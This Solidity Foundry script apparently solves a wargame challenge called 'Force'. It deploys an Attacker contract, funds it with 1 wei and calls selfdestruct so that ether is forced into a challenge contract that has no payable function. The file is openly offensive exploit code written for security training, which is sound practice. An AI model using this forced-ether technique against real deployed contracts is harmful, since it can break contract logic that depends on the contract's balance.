// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Force } from "../src/07_Force.sol";

contract Attacker {

  address challengeInstanceAddress;
  constructor(address _challengeInstanceAddress) {
    challengeInstanceAddress = _challengeInstanceAddress;
  }
  
  function destroy() external {
    selfdestruct(payable(challengeInstanceAddress));
  }
  receive() external payable {}
}

contract ForceAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    
    HelperConfig helperConfig = new HelperConfig();
    address challengeInstanceAddress = helperConfig.instances("Force");
    Force challenge = Force(challengeInstanceAddress);
    
    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    (bool success, ) = address(attacker).call{value: 1 wei}("");
    require(success, "Failed to send eth");
    
    attacker.destroy();
    
    console.log("Balance of challenge contract: ", address(challenge).balance);
    
    vm.stopBroadcast();
  }

}